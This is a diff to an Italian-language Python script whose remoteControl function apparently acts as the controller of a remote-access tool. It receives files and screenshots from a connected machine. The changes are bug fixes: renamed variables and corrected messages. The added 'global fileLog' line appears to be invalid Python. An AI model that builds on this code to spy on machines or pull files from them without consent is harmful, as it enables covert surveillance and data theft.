@@ -1,5 +1,4 @@
 import os
-import pickle
 import re
 from socket import *
 import platform
@@ -9,7 +8,6 @@ import signal
 from os import system
 import traceback
 import sys
-from traceback import print_exc
 from tqdm import tqdm
 from colorama import Fore
 
@@ -266,7 +264,8 @@ def remoteControl(clientConnection,buff):
 
             elif comando[0:8] == "download":
                 try:
-                    file = open(comando[10:len(comando) - 1], 'wb')
+                    nomeFile=comando[10:len(comando) - 1]
+                    file = open(nomeFile, 'wb')
                     for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + "Scaricamento file.png...", colour="green",
                                   ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                         sleep(0.2)
@@ -278,7 +277,7 @@ def remoteControl(clientConnection,buff):
                     except:
                         fileIf = ""
 
-                    if filesize[0:7]!="[ERROR]":
+                    if fileIf[0:7]!="[ERROR]":
 
                         scritti = 0
                         while (filerecv):
@@ -292,14 +291,14 @@ def remoteControl(clientConnection,buff):
                         if os.path.getsize(comando[10:len(comando) - 1]) <= 0:
                             fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
                             print("Download fallito\n")
-                            os.remove(file)
-                        elif scritti < os.path.getsize(nomeFoto):
+                            os.remove(nomeFile)
+                        elif scritti < os.path.getsize(nomeFile):
                             fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
                             print("Download fallito\n")
-                            os.remove(file)
+                            os.remove(nomeFile)
                         else:
-                            fileLog = fileLog + "\n" + f"File scaricato correttamente\n" + "\n"
-                            print(f"File scaricato correttamente\n")
+                            fileLog = fileLog + "\n" + f"File {nomeFile} scaricato correttamente\n" + "\n"
+                            print(f"File {nomeFile} scaricato correttamente\n")
                         time.sleep(2)
                     else:
                         raise Exception
@@ -341,8 +340,8 @@ def remoteControl(clientConnection,buff):
                             print("Screenshot fallito\n")
                             os.remove(nomeFoto)
                         elif scritti < os.path.getsize(nomeFoto):
-                            fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
-                            print("Download fallito\n")
+                            fileLog = fileLog + "\n" + "Screenshot fallito\n" + "\n"
+                            print("Screenshot fallito\n")
                             os.remove(nomeFoto)
                         else:
                             fileLog = fileLog + "\n" + f"Screenshot scaricato correttamente\n" + "\n"
@@ -361,6 +360,7 @@ def remoteControl(clientConnection,buff):
                fileLog = fileLog + "\n" + "[COMANDO ERRATO/NON DISPONIBILE] Command not found... \n"
 
         except Exception as e:
+            global fileLog
             traceback.print_exc()
             if e.__class__.__name__ == "ConnectionResetError":
                 print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
